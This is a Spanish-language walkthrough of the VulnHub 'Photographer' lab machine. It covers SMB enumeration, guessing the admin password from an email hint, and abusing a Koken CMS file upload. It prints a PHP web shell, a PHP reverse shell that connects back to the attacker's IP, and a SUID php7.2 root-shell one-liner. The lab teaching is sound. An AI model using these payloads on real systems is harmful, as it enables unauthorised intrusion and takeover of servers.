## Photographer Pentesting
### Description
🧾 Descripción de la Máquina - Photographer (VulnHub)
Photographer es una máquina tipo boot2root de dificultad intermedia, diseñada para practicar habilidades de pentesting orientadas a la certificación OSCP. El objetivo es obtener dos flags (user.txt y proof.txt) a través de técnicas de enumeración, explotación web y escalada de privilegios.
La máquina simula un entorno realista con un sitio web vulnerable y ofrece una buena oportunidad para aplicar herramientas y metodologías comunes en entornos ofensivos.

### Información
- **Nombre de la máquina**: Photographer
- **Ip atacante**: 192.168.1.140 
- **Ip víctima**: 192.168.1.148

### NetDiscover 
```bash
sudo netdiscover -r 192.168.1.0/16
```
 - Lo cual nos devuelve la siguiente información:

```bash
Currently scanning: 192.168.31.0/16   |   Screen View: Unique Hosts                                                                                                                                                                       
                                                                                                                                                                                                                                           
 8 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 480                                                                                                                                                                           
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     3c:a7:ae:93:00:54      1      60  zte corporation                                                                                                                                                                         
 192.168.1.135   b4:8c:9d:35:82:55      1      60  AzureWave Technology Inc.                                                                                                                                                               
 192.168.1.148   00:0c:29:26:65:49      1      60  VMware, Inc.                                                                                                                                                                            
 192.168.1.128   5c:51:81:4d:62:1d      1      60  Samsung Electronics Co.,Ltd                                                                                                                                                             
 192.168.1.147   ee:f3:f9:0b:5e:be      2     120  Unknown vendor                                                                                                                                                                          
 192.168.1.132   b2:53:2d:1c:73:10      1      60  Unknown vendor                                                                                                                                                                          
 192.168.1.134   62:19:cd:dc:68:d4      1      60  Unknown vendor  
```
### Nmap
```bash
┌──(kali㉿kali)-[~/Photographer]
└─$ sudo nmap 192.168.1.148 -sS -sV               

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-08 15:42 EDT
Nmap scan report for 192.168.1.148 (192.168.1.148)
Host is up (0.00049s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 00:0C:29:26:65:49 (VMware)
Service Info: Host: PHOTOGRAPHER

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.58 seconds
```
### Vamos a empezar con samba, los puertos 139 y 445
```bash
┌──(kali㉿kali)-[~/Photographer]
└─$ smbclient -L //192.168.1.148 -U%            


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            PHOTOGRAPHER
```
- Vemos que hay un archivo de samba que no es una de los predefinidos "sambashare", por lo que vamos a intentar acceder a el.

### Conexión al recurso compartido
```bash
┌──(kali㉿kali)-[~/Photographer]
└─$ smbclient "//192.168.1.148/sambashare" -U "guest"%

Try "help" to get a list of possible commands.
smb: \> get mailsent.txt
getting file \mailsent.txt of size 503 as mailsent.txt (122.8 KiloBytes/sec) (average 122.8 KiloBytes/sec)
smb: \> exit

┌──(kali㉿kali)-[~/Photographer]
└─$ cat mailsent.txt 
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```
- Vemos que dice algo de una página web, y que no olvidemos nuestro secreto. Vamos a ver si podemos encontrar algo en la página web.

![alt text](/ANEXOS/image.png)

- Esta es la página de inicio de la página. Eso en el puerto 80. Vamos a ver que hay en el puerto 8000.

![alt text](/ANEXOS/image_2.png)

- Vemos que esta es la página que decia que ya estaba lista de parte de Daisa. 
- Lo primero se me ha occurrido cuando he visto esto, es que podría haber más páginas, por lo que voy a hacer es utilizar wfuzz para ver si hay más páginas.
```bash
┌──(kali㉿kali)-[~/Photographer]
└─$ wfuzz --hc=404 -c -z file,/home/kali/Downloads/common.txt -u http://192.168.1.148/FUZZ
```
- Nos va a sacar una página de "admin", si nos metemos tenemos esto:

![alt text](/ANEXOS/image_3.png)

- En este caso ya tenemos el correo que nos ha dado antes el archivo que hemos sacado:
```"daisa@photographer.com"```
Estuve un rato grande probando diferentes combinaciones de usuarios y contraseñas, con hydra y con el diccionario rockyou.txt, pero no conseguí nada. Resulta que la contraseña estaba en forma de pista en el mismo archivo que sacamos de samba.
- La pista era "Don't forget your secret, my babygirl ;)" y la contraseña era "babygirl". (por la cara)

- Nos da acceso a la siguiente página: 
![alt text](/ANEXOS/image_4.png)

- Vemos que la página funciona con koken, un gestor de contenido para fotógrafos. Lo que vamos a hacer es buscar una vulnerabilidad en la versión de koken que tiene. Si lo buscamos con searchsploit, nos da la siguiente vulnerabilidad:
```bash
┌──(kali㉿kali)-[~/Photographer]
└─$ searchsploit -w koken
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                                                                                                                 |  URL
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)                                                                                                                                      | https://www.exploit-db.com/exploits/48706
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
```
- Vamos a descargarnos este archivo y a subirlo a la pagina web. 

![alt text](/ANEXOS/image_5.png)

#### Configurar archivo para el exploit
- **Paso 1:** Crear un archivo PHP malicioso
    Primero, necesitas crear un archivo PHP que ejecute comandos en el servidor a través de la URL.
    Abre un editor de texto y escribe el siguiente código PHP:
```php
<?php system($_GET['cmd']);?>
```
Este código permite ejecutar comandos en el servidor cuando se pasa como parámetro el valor cmd en la URL.
- **Paso 2:** Guarda el archivo como image.php.jpg. La extensión .jpg se utiliza para burlar las restricciones de tipos de archivo que podría permitir el sistema.
- **Paso 3:** En burpsuit, vamos a ver la solicitud http que nos ha dado al subir el archivo, vemos lo siguiente:

![alt text](/ANEXOS/image_6.png)

- **Paso 4:** Cambiamos el nombre del archivo a image.php y lo subimos.
Lo primero que vamos a hacer es utilizar BurpSuit para poder modificar la petición y poder subir el archivo con formato php. , ya que la página solo nos deja subir archivos jpg., por eso lo hemos llamado image.php.jpg. Una vez localizado el POST por el cual hemos mandado la petición del archivo vamos a hacer lo siguiente:

- ![alt text](/ANEXOS/image_7.png)
- ![alt text](/ANEXOS/image_8.png)

- Lo que vamos lograr al cambiar el nombre, es ejecutar el archivo PHP que hemos subido.
![alt text](/ANEXOS/image_9.png)

- Como podemos ver en esta imagen, hemos conseguido ejecutar el archivo PHP que hemos subido. Pero en este caso en la misma página web, con la url: http://192.168.1.148:8000/storage/originals/2f/0d/image.php?cmd=whoami, en este caso nos da que somos el usuario www-data.

- Pero esto no funciona como una reverseshell, por lo que vamos a intentar conseguir una reverse shell. Para ello, vamos a utilizar el siguiente código:
```php
<?php
// filepath: reverse_shell.php
$ip = '192.168.1.140'; // Cambia esto por tu IP
$port = 4444; // Puerto de escucha
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```
- Hacemos los mismos pasos que antes, pero en este caso lo guardamos como reverse_shell.php.jpg. Cuando nos metamos en la url de descarga del archivo, se ejecutará el código y nos dará una reverse shell.

![alt text](/ANEXOS/image_10.png)

- Limpiamos la shell y nos quedamos con una shell limpia. 
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
- El comando /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);" ejecuta un shell como root aprovechando una vulnerabilidad en un binario con el bit SUID activado. A continuación, te explico qué hace cada parte del comando:
- Cuando lo ejecutamos, nos da una shell como root. 

![alt text](/ANEXOS/image_11.png)

- Ahora solo nos queda buscar el flag de root. 
```bash
┌──(kali㉿kali)-[~/Photographer]
└─$ find / -name "proof.txt" 2>/dev/null
/home/photographer/proof.txt
```
- Y ya tenemos el flag de root. 
![alt text](/ANEXOS/image_12.png)


